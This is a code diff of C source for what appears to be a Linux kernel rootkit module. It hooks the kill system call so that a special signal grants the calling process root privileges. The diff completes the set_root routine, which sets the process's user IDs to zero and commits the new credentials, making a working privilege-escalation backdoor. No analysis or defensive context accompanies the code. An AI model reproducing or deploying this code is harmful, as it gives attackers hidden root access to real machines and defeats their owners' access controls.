@@ -18,9 +18,14 @@ static void set_root(void)
     struct cred *root;
     root = prepare_creds();
     if (!root)
-	return;
-
+	    return;
+    // Set all User IDs to 0 (root)
+    root->uid.val   = 0;
+    root->fsuid.val = 0;    // filesystem
+    root->euid.val  = 0;    // Effective
+    root->suid.val  = 0;    // Saved
     
+    commit_creds(root);
 }
 
 #ifdef PTREGS_SYSCALL_STUBS
@@ -31,7 +36,7 @@ static asmlinkage int hooked_kill(const struct pt_regs *registers)
     int sig = registers->si;
     if (sig == SET_ROOT_SIGNAL)
     {
-	      set_root();
+	    set_root();
         return 0;
     }
     return orig_kill(registers);
@@ -43,7 +48,7 @@ static asmlinkage int hooked_kill(pid_t pid, int sig)
 {
     if (sig == SET_ROOT_SIGNAL)
     {
-	      set_root();
+	    set_root();
         return 0;
     }
     return orig_kill(pid, sig);
